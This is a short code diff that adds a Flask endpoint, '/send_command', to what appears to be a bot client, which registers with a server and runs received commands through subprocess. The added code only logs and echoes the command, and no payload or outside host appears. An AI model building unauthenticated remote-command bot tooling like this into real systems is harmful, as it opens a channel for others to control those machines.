@@ -67,6 +67,14 @@ def execute_command(command_data):
         except subprocess.CalledProcessError as e:
             print("Failed to execute command:", e)
 
+@app.route('/send_command', methods=['POST'])
+def handle_command():
+    data = request.json
+    # Process the command here, for example:
+    print(f"Received command: {data}")
+    # Implement action based on received command
+    return jsonify({"message": "Command received", "your_data": data}), 200
+
 import requests
 
 def register_bot(server_url, bot_id):
